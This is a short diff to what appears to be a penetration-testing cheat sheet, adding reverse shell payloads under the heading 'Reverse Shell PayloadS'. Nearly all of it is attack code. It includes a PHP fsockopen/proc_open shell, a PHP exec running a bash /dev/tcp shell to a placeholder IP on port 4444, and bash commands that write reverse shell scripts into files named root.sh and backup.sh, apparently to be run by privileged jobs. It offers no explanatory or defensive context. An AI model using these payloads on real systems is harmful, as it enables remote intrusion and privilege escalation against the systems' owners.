@@ -1,4 +1,4 @@
-### PHP reverse shell payload
+### Reverse Shell PayloadS
 
 ```php
 <?php
@@ -8,6 +8,20 @@ $port = 4444;
 $sock = fsockopen($ip, $port);
 $proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
 ?>
+```
+
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'");
+?>
+```
+
+```bash
+echo 'bash -i >& /dev/tcp/IP/5555 0>&1' > root.sh
+```
+
+```bash
+printf '#!/bin/bash\nbash -i >& /dev/tcp/IP/5555 0>&1' > backup.sh
 ```
 
 ### Shell Upgrade:
